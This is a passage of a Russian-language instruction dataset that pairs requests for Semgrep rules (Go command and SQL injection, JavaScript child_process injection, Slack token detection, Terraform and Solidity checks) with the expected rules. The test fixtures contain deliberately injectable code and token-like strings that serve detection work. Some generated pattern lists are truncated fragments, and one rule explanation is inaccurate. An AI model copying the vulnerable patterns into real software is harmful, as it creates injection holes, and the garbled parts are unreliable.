Args: [..userInput, \"bar\"], ...}\n• cmdPath,_ := exec.LookPath(\"bash\"); ... cmd := &exec.Cmd {... Args: [..cmdPath, \"-c\", userInput], ...}\n\nБезопасные паттерны:  \n• cmdPath,_ := exec.LookPath(\"go\"); ... cmd := &exec.Cmd {... Args: [..cmdPath, \"bar\"], ...}\n• cmd := &exec.Cmd {... Path: \"fixed-path\", Args: [..\"fixed-args\"], ...}\n• cmd := &exec.Cmd {... Path: exec.LookPath(\"fixed-path\"), Args: [..\"fixed-args\"], ...}\n\nЛегенда аннотаций:\n- // ruleid:dangerous-exec-cmd: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-exec-cmd: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-exec-cmd\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: |\n          exec.Cmd {...,Path: $CMD,...}\n      - pattern-not: |\n          exec.Cmd {...,Path: \"...\",...}\n      - pattern-not-inside: |\n          $CMD,$ERR := exec.LookPath(\"...\");\n          ...\n      - pattern-not-inside: |\n          $CMD = \"...\";\n          ...\n    - patterns:\n      - pattern: |\n          exec.Cmd {...,Args: $ARGS,...}\n      - pattern-not: |\n          exec.Cmd {...,Args: []string{...},...}\n      - pattern-not-inside: |\n          $ARGS = []string{\"...\",...};\n          ...\n      - pattern-not-inside: |\n          $CMD = \"...\";\n          ...\n          $ARGS = []string{$CMD,...};\n          ...\n      - pattern-not-inside: |\n          $CMD = exec.LookPath(\"...\");\n          ...\n          $ARGS = []string{$CMD,...};\n          ...\n    - patterns:\n      - pattern: |\n          exec.Cmd {...,Args: []string{$CMD,...},...}\n      - pattern-not: |\n          exec.Cmd {...,Args: []string{\"...\",...},...}\n      - pattern-not-inside: |\n          $CMD,$ERR := exec.LookPath(\"...\");\n          ...\n      - pattern-not-inside: |\n          $CMD = \"...\";\n          ...\n    - patterns:\n      - pattern-either:\n        - pattern: |\n            exec.Cmd {...,Args: []string{\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\",$EXE,...},...}\n        - patterns:\n          - pattern: |\n              exec.Cmd {...,Args: []string{$CMD,\"-c\",$EXE,...},...}\n          - pattern-inside: |\n              $CMD,$ERR := exec.LookPath(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\");\n              ...\n      - pattern-not: |\n          exec.Cmd {...,Args: []string{\"...\",\"...\",\"...\",...},...}\n      - pattern-not-inside: |\n          $EXE = \"...\";\n          ...\n  - pattern-inside: |\n      import \"os/exec\"\n      ...\n  message: >-\n    Detected non-static command inside exec.Cmd. Audit the input to 'exec.Cmd'.\n    If unverified user data can reach this call site, this is a code injection\n    vulnerability. A malicious actor can inject a malicious script to execute\n    arbitrary code.\n  metadata:\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - go\n    confidence: MEDIUM\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  severity: ERROR\n  languages: [go]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных вызовов метода exec.Cmd в Go, где путь или аргументы команды могут быть динамически сформированы на основе пользовательских данных. Правило проверяет наличие конструкции exec.Cmd с динамическими значениями в полях Path и Args, которые не были явно инициализированы константами или безопасными значениями. В опасных примерах используются переменные, возвращаемые функциями LookPath или содержащие пользовательские данные напрямую. Безопасные примеры показывают явную инициализацию путей и аргументов команд фиксированными строками.\n\n# Ключевые элементы:\n- ID: dangerous-exec-cmd\n- Язык: go \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-exec-cmd",
      "language": "go",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: string-formatted-query\nОписание уязвимости: String-formatted SQL query detected. This could lead to SQL injection if the string is not sanitized properly. Audit this call to ensure the SQL is not manipulable by external data.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: string-formatted-query.go\npackage main\n\nimport (\n\t\"context\"\n\t\"database/sql\"\n\t\"fmt\"\n\t\"http\"\n\n\t\"github.com/jackc/pgx/v4\"\n)\n\nvar db *sql.DB\nvar postgresDb *pgx.Conn\n\nfunc dbExec(r *http.Request) {\n\tcustomerId := r.URL.Query().Get(\"id\")\n\t// ruleid: string-formatted-query\n\tquery := \"SELECT number, expireDate, cvv FROM creditcards WHERE customerId = \" + customerId\n\n\trow, _ := db.Exec(query)\n\n\t// ok: string-formatted-query\n\tout, err := sshClient.Exec(fmt.Sprintf(\"sudo bash %s\", scriptPath))\n}\n\nfunc okDbExec(r *http.Request) {\n\tcustomerId := r.URL.Query().Get(\"id\")\n\t// ok: string-formatted-query\n\tquery := \"SELECT number, expireDate, cvv FROM creditcards WHERE customerId = customerId\"\n\n\trow, _ := db.Exec(query)\n}\n\nfunc dbQuery1(r *http.Request) {\n    // ruleid: string-formatted-query\n    _, err = db.Query(\"INSERT into users (username, password) VALUES(\" + username + \", \" + password)\n    if err != nil {\n        http.Error(\"mistake\")\n    }\n}\n\nfunc dbQuery2(r *http.Request, username string, password string) {\n    // ruleid: string-formatted-query\n    query = \"INSERT into users (username, password) VALUES(\" + username + \", \" + password\n    _, err = db.QueryRow(query)\n    if err != nil {\n        http.Error(\"mistake\")\n    }\n}\n\nfunc dbQuery3(r *http.Request, username string) {\n    // ruleid: string-formatted-query\n    query = username + \" AND INSERT into users (username, password)\"\n    _, err = db.Exec(query)\n    if err != nil {\n        http.Error(\"mistake\")\n    }\n}\n\nfunc dbQuery4(r *http.Request, username string) {\n    // ruleid: string-formatted-query\n    query := fmt.Sprintf(\"%s AND INSERT into users (username, password)\", username)\n    _, err = db.Exec(query)\n    if err != nil {\n        http.Error(\"mistake\")\n    }\n}\n\nfunc dbQuery5(r *http.Request, username string, password string) {\n\t// ruleid: string-formatted-query\n\tquery := fmt.Sprintf(\"INSERT into users (username, password) VALUES(%s, %s)\", username, password)\n\t_, err = db.QueryRow(query)\n\tif err != nil {\n\t\thttp.Er  # Ограничиваем длину\n\nОпасные паттерны:\n• query := \\\n•  + customerId\n• query := fmt.Sprintf(\\\n\nБезопасные паттерны:  \n• query := \\\n• query := \\\n\nЛегенда аннотаций:\n- // ruleid:string-formatted-query: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:string-formatted-query: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: string-formatted-query\n  languages: [go]\n  message: >-\n    String-formatted SQL query detected. This could lead to SQL injection if\n    the string is not sanitized properly. Audit this call to ensure the\n    SQL is not manipulable by external data.\n  severity: WARNING\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    source-rule-url: https://github.com/securego/gosec\n    category: security\n    technology:\n    - go\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  patterns:\n  - metavariable-regex:\n        metavariable: $OBJ\n        regex: (?i).*(db|database)\n  - pattern-not-inside: |\n      $VAR = \"...\" + \"...\"\n      ...\n      $OBJ.$SINK(..., $VAR, ...)\n  - pattern-not: $OBJ.Exec(\"...\")\n  - pattern-not: $OBJ.ExecContext($CTX, \"...\")\n  - pattern-not: $OBJ.Query(\"...\")\n  - pattern-not: $OBJ.QueryContext($CTX, \"...\")\n  - pattern-not: $OBJ.QueryRow(\"...\")\n  - pattern-not: $OBJ.QueryRow($CTX, \"...\")\n  - pattern-not: $OBJ.QueryRowContext($CTX, \"...\")\n  - pattern-either:\n    - pattern: $OBJ.Exec($X + ...)\n    - pattern: $OBJ.ExecContext($CTX, $X + ...)\n    - pattern: $OBJ.Query($X + ...)\n    - pattern: $OBJ.QueryContext($CTX, $X + ...)\n    - pattern: $OBJ.QueryRow($X + ...)\n    - pattern: $OBJ.QueryRow($CTX, $X + ...)\n    - pattern: $OBJ.QueryRowContext($CTX, $X + ...)\n    - pattern: $OBJ.Exec(fmt.$P(\"...\", ...))\n    - pattern: $OBJ.ExecContext($CTX, fmt.$P(\"...\", ...))\n    - pattern: $OBJ.Query(fmt.$P(\"...\", ...))\n    - pattern: $OBJ.QueryContext($CTX, fmt.$P(\"...\", ...))\n    - pattern: $OBJ.QueryRow(fmt.$P(\"...\", ...))\n    - pattern: $OBJ.QueryRow($CTX, fmt.$U(\"...\", ...))\n    - pattern: $OBJ.QueryRowContext($CTX, fmt.$P(\"...\", ...))\n    - patterns:\n        - pattern-either:\n            - pattern: $QUERY = fmt.Fprintf($F, \"$SQLSTR\", ...)\n            - pattern: $QUERY = fmt.Sprintf(\"$SQLSTR\", ...)\n            - pattern: $QUERY = fmt.Printf(\"$SQLSTR\", ...)\n            - pattern: $QUERY = $X + ...\n        - pattern-either:\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.Query($QUERY, ...)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.ExecContext($CTX, $QUERY, ...)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.Exec($QUERY, ...)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.QueryRow($CTX, $QUERY)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.QueryRow($QUERY)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.QueryContext($CTX, $QUERY)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.QueryRowContext($CTX, $QUERY, ...)\n                    ...\n                }\n                \n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска строковых форматированных запросов SQL, которые могут привести к инъекции SQL при недостаточной их обработке. Анализ выполняется путем поиска вызовов методов Exec, Query и QueryRow объектов базы данных, таких как sql.DB или pgx.Conn, где строка запроса формируется динамически через конкатенацию строк или функции форматирования, такие как fmt.Sprintf, fmt.Printf и fmt.Fprintf. Правило также учитывает случаи, когда запрос передается внутрь функций, определенных пользователем, используя шаблон inside function.\n\n# Ключевые элементы:\n- ID: string-formatted-query\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "string-formatted-query",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения keyvault-content-type-for-secret\nОписание уязвимости: Key vault Secret should have a content type set\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: keyvault-content-type-for-secret.tf\nresource \"azurerm_key_vault_secret\" \"good_example\" {\n  name         = \"secret-sauce\"\n  value        = \"qwerty\"\n  key_vault_id = azurerm_key_vault.example.id\n  content_type = \"password\"\n}\n\n# ruleid: keyvault-content-type-for-secret\nresource \"azurerm_key_vault_secret\" \"bad_example\" {\n  name         = \"secret-sauce\"\n  value        = \"qwerty\"\n  key_vault_id = azurerm_key_vault.example.id\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_key_vault_secret\" \"bad_example\" { \n  name = \"secret-sauce\"\n  value = \"qwerty\"\n  key_vault_id = azurerm_key_vault.example.id\n}\n• resource \"azurerm_key_vault_secret\" \"another_bad_example\" { \n  name = \"my-secret\"\n  value = \"abc123\"\n  key_vault_id = azurerm_key_vault.example_2.id\n}\n• resource \"azurerm_key_vault_secret\" \"yet_another_bad_example\" { \n  name = \"sensitive-data\"\n  value = \"xyz789\"\n  key_vault_id = azurerm_key_vault.example_3.id\n}\n\nБезопасные паттерны:  \n• resource \"azurerm_key_vault_secret\" \"good_example\" { \n  name = \"secret-sauce\"\n  value = \"qwerty\"\n  key_vault_id = azurerm_key_vault.example.id\n  content_type = \"password\"\n}\n• resource \"azurerm_key_vault_secret\" \"safe_example_2\" { \n  name = \"important-info\"\n  value = \"123456\"\n  key_vault_id = azurerm_key_vault.example_4.id\n  content_type = \"api-key\"\n}\n• resource \"azurerm_key_vault_secret\" \"safe_example_3\" { \n  name = \"confidential-data\"\n  value = \"abcdef\"\n  key_vault_id = azurerm_key_vault.example_5.id\n  content_type = \"database-password\"\n}\n\nЛегенда аннотаций:\n- // ruleid:keyvault-content-type-for-secret: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:keyvault-content-type-for-secret: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: keyvault-content-type-for-secret\n  message: >-\n    Key vault Secret should have a content type set\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_key_vault_secret\" \"...\" {\n      ...\n      content_type = \"...\"\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_key_vault_secret\" \"...\" {\n      ...\n      }\n  metadata:\n    category: correctness\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#content_type\n    - https://docs.microsoft.com/en-us/azure/key-vault/secrets/about-secrets\n  languages: [hcl]\n  severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Key Vault Secret, у которых не установлен атрибут 'content_type'. Анализ выполняется путем поиска шаблона ресурса Key Vault Secret и исключения случаев, когда внутри этого шаблона явно указан атрибут 'content_type'. Правило использует оператор NOT INSIDE для исключения явных примеров и оператор INSIDE для включения всех остальных случаев, где может быть пропущена настройка content_type.\n\n# Ключевые элементы:\n- ID: keyvault-content-type-for-secret\n- Язык: hcl \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "keyvault-content-type-for-secret",
      "language": "hcl",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: non-optimal-variables-swap\nОписание уязвимости: Consider swapping variables using `($VAR1, $VAR2) = ($VAR2, $VAR1)` to save gas\nCWE: \nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: non-optimal-variables-swap.sol\npragma solidity 0.8.0;\n\n\ncontract Test1{\n    uint256 a;\n    uint256 b;\n    uint256 c;\n    \n    function f1() {\n        // ruleid: non-optimal-variables-swap\n        c = a;\n        a = b;\n        b = c;\n    }\n}\n\ncontract Tes2{\n    uint256 a;\n    uint256 b;\n    \n    function f1() {\n        // ruleid: non-optimal-variables-swap\n        uint256 c = a;\n        a = b;\n        b = c;\n    }\n\n    function f1() {\n        // ruleid: non-optimal-variables-swap\n        uint256 c = a;\n        a = b;\n        f1();\n        b = c;\n    }\n}\n\ncontract Test3{\n    uint256 a;\n    uint256 b;\n    uint256 c;\n    \n    function f1() {\n        // ok: non-optimal-variables-swap\n        (b, a) = (a, b); \n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: non-optimal-variables-swap.sol\\ncontract Test1{\\n    uint256 a;\\n    uint256 b;\\n    uint256 c;\\n\\n    function f1() {\\n        // ruleid: non-optimal-variables-swap\\n        c = a;\\n        \n• // File: non-optimal-variables-swap.sol\\ncontract Tes2{\\n    uint256 a;\\n    uint256 b;\\n\\n    function f1() {\\n        // ruleid: non-optimal-variables-swap\\n        uint256 c = a;\\n        a = b;\\n \n\nБезопасные паттерны:  \n• // File: non-optimal-variables-swap.sol\\ncontract Test3{\\n    uint256 a;\\n    uint256 b;\\n    uint256 c;\\n\\n    function f1() {\\n        // ok: non-optimal-variables-swap\\n        (b, a) = (a, b);\\n  \n\nЛегенда аннотаций:\n- // ruleid:non-optimal-variables-swap: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:non-optimal-variables-swap: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: non-optimal-variables-swap\n    message: Consider swapping variables using `($VAR1, $VAR2) = ($VAR2, $VAR1)` to save gas\n    languages: [solidity]\n    severity: INFO\n    metadata:\n      category: performance\n      technology:\n        - solidity\n      references:\n        - https://dev.to/oliverjumpertz/solidity-quick-tip-efficiently-swap-two-variables-1f8i\n    patterns:\n      - pattern: |\n          $TMP = $VAR1;\n          ...\n          $VAR1 = $VAR2;\n          ...\n          $VAR2 = $TMP;\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска неэффективных обменов переменных, которые не используют оптимизированную конструкцию Solidity ($VAR1, $VAR2) = ($VAR2, $VAR1). Паттерн ищет последовательность операторов, где сначала создается временная переменная ($TMP), затем первая переменная ($VAR1) присваивается временной, а вторая переменная ($VAR2) присваивается первой переменной, после чего временная переменная ($TMP) присваивается второй переменной. Это правило применимо только к языкам, поддерживающим Solidity, и сигнализирует о возможности оптимизации путем использования встроенного оператора обмена переменных Solidity.\n\n# Ключевые элементы:\n- ID: non-optimal-variables-swap\n- Язык: solidity \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "non-optimal-variables-swap",
      "language": "solidity",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: detect-child-process\nОписание уязвимости: Allowing spawning arbitrary programs or running shell processes with arbitrary arguments may end up in a command injection vulnerability. Try to avoid non-literal values for the command string. If it is not possible, then do not let running arbitrary commands, use a white list for inputs.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detect-child-process.js\nconst cp = require('child_process');\n\nexports.handler = async (event) => {\n    // ruleid:detect-child-process\n    cp.exec(`cat *.js ${event['file']}| wc -l`, (error, stdout, stderr) => {\n        console.log(stdout)\n    });\n\n    // ruleid:detect-child-process\n    cp.spawnSync(event['cmd']);\n\n    // ok:detect-child-process\n    cp.exec('ls')\n};  # Ограничиваем длину\n\nОпасные паттерны:\n• cp.exec(`cat *.js ${event['file']}| wc -l`, (error, stdout, stderr) => { ... });\n• cp.spawnSync(event['cmd']);\n\nБезопасные паттерны:  \n• cp.exec('ls');\n\nЛегенда аннотаций:\n- // ruleid:detect-child-process: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-child-process: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-child-process\n  message: >-\n    Allowing spawning arbitrary programs or running shell processes with arbitrary arguments may end up\n    in a command injection vulnerability.\n    Try to avoid non-literal values for the command string.\n    If it is not possible, then do not let running arbitrary commands, use a white list for inputs.\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - javascript\n    - aws-lambda\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: $EVENT\n    - pattern-either:\n      - pattern-inside: |\n          exports.handler = function ($EVENT, ...) {\n            ...\n          }\n      - pattern-inside: |\n          function $FUNC ($EVENT, ...) {...}\n          ...\n          exports.handler = $FUNC\n      - pattern-inside: |\n          $FUNC = function ($EVENT, ...) {...}\n          ...\n          exports.handler = $FUNC\n  pattern-sinks:\n  - patterns:\n    - focus-metavariable: $CMD\n    - pattern-either:\n      - pattern: exec($CMD,...)\n      - pattern: execSync($CMD,...)\n      - pattern: spawn($CMD,...)\n      - pattern: spawnSync($CMD,...)\n      - pattern: $CP.exec($CMD,...)\n      - pattern: $CP.execSync($CMD,...)\n      - pattern: $CP.spawn($CMD,...)\n      - pattern: $CP.spawnSync($CMD,...)\n    - pattern-either:\n      - pattern-inside: |\n          require('child_process')\n          ...\n      - pattern-inside: |\n          import 'child_process'\n          ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования child process API (cp.exec, cp.execSync, cp.spawn, cp.spawnSync) с источниками данных, которые могут быть загрязнены (tainted), то есть получены извне или изменены пользователем. Источники определяются через шаблоны, включающие переменную $EVENT, которая может быть передана в функцию handler или использоваться внутри определения функции. Синки обнаруживаются путем проверки вызовов этих методов с передачей потенциально загрязненных аргументов.\n\n# Ключевые элементы:\n- ID: detect-child-process\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detect-child-process",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: slack-legacy-bot-token\nОписание уязвимости: A gitleaks slack-legacy-bot-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: slack-legacy-bot-token.txt\n// ruleid: slack-legacy-bot-token\n\"bot_token1\": \"xoxb-263594206564-FGqddMF8t08v8N7Oq4i57vs1\"\n// ruleid: slack-legacy-bot-token\n\"bot_token2\": \"xoxb-282029623751-BVtmnS3BQitmjZvjpQL7PSGP\"\n// ruleid: slack-legacy-bot-token\n\"bot_token3\": \"xoxb-47834520726-N3otsrwj8Cf99cs8GhiRZsX1\"\n// ruleid: slack-legacy-bot-token\n\"bot_token4\": \"xoxb-123456789012-Xw937qtWSXJss1lFaKe\" \n// ruleid: slack-legacy-bot-token\n\"bot_token5\": \"xoxb-312554961652-uSmliU84rFhnUSBq9YdKh6lS\" \n// ruleid: slack-legacy-bot-token\n\"bot_token6\": \"xoxb-51351043345-Lzwmto5IMVb8UK36MghZYMEi\" \n// ruleid: slack-legacy-bot-token\n\"bot_token7\": \"xoxb-130154379991-ogFL0OFP3w6AwdJuK7wLojpK\" \n// ruleid: slack-legacy-bot-token\n\"bot_token8\": \"xoxb-159279836768-FOst5DLfEzmQgkz7cte5qiI\" \n// ruleid: slack-legacy-bot-token\n\"bot_token9\": \"xoxb-50014434-slacktokenx29U9X1bQ\"\n// ruleid: slack-legacy-bot-token\n\"bot_token10\": \"xoxb-3826305966-idr3lp1qzwskp7yaii430obs \n// ruleid: slack-legacy-bot-token\n\"bot_token11\": \"xoxb-940448933124-tjowlljrekgskhmnhbcupub  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: slack-legacy-bot-token\n\"bot_token\": \"xoxb-123456789012-Xw937qtWSXJss1lFaKe\"\n• // ruleid: slack-legacy-bot-token\nconst SLACK_BOT_TOKEN = 'xoxb-312554961652-uSmliU84rFhnUSBq9YdKh6lS';\n• // ruleid: slack-legacy-bot-token\nSLACK_BOT_TOKEN = xoxb-51351043345-Lzwmto5IMVb8UK36MghZYMEi;\n\nБезопасные паттерны:  \n• // safe example\nconst SLACK_BOT_TOKEN = process.env.SLACK_BOT_TOKEN;\n• // safe example\nSLACK_BOT_TOKEN = getSecureVault().getToken('slack_bot');\n• // safe example\nlet token = fetchFromHsm('slackBotToken');\n\nЛегенда аннотаций:\n- // ruleid:slack-legacy-bot-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:slack-legacy-bot-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: slack-legacy-bot-token\n  message: A gitleaks slack-legacy-bot-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (xoxb-[0-9]{8,14}\\-[a-zA-Z0-9]{18,26})\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов Slack legacy bot в исходном коде. Паттерн ищет строку, начинающуюся с 'xoxb-', за которой следует от 8 до 14 цифр, затем дефис и далее от 18 до 26 буквенно-цифровых символов. Это соответствует формату токена Slack legacy bot. Правило применяет поисковый анализ и возвращает предупреждение при обнаружении таких токенов, рекомендуя использовать переменные окружения или безопасные хранилища для хранения секретов.\n\n# Ключевые элементы:\n- ID: slack-legacy-bot-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "slack-legacy-bot-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения useless-compare\nОписание уязвимости: This comparison is useless because the expressions being compared are identical. This is expected to always return the same result, 0, unless your code is really strange.\nCWE: \nТип анализа: search\nЯзык: ocaml",
    "input": "Требования:\n- Язык: ocaml\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: useless-compare.ml\nlet test a b =\n  (* ruleid:useless-compare *)\n  let c = compare (a+b) (a+b) in\n  if c <> 0 then c\n  else\n    compare a b\n\nlet test a b =\n  (* ruleid:useless-compare *)\n  let c = Int.compare (a+b) (a+b) in\n  if c <> 0 then c\n  else\n    compare a b  # Ограничиваем длину\n\nОпасные паттерны:\n• let c = compare (a+b) (a+b);\n• let d = Int.compare (x+y) (x+y);\n\nБезопасные паттерны:  \n• let e = compare (a+b) (c+d);\n• let f = Int.compare (i+j) (k+l);\n\nЛегенда аннотаций:\n- // ruleid:useless-compare: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:useless-compare: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: useless-compare\n  patterns:\n  - pattern-either:\n    - pattern: compare $X $X\n    - pattern: $MODULE.compare $X $X\n\n  message: >-\n    This comparison is useless because the expressions being compared\n    are identical. This is expected to always return the same result,\n    0, unless your code is really strange.\n  languages: [ocaml]\n  severity: ERROR\n  metadata:\n    category: correctness\n    technology:\n    - ocaml\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска сравнений, которые всегда возвращают одинаковый результат, за исключением необычных случаев. Анализ выполняется путем поиска конструкций 'compare X X' или '$MODULE.compare X X', где X может быть любым выражением. Паттерн либо ищет прямое сравнение идентичных переменных, либо использует функцию сравнения модуля, переданную два одинаковых аргумента.\n\n# Ключевые элементы:\n- ID: useless-compare\n- Язык: ocaml \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "useless-compare",
      "language": "ocaml",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: slack-legacy-token\nОписание уязвимости: A gitleaks slack-legacy-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
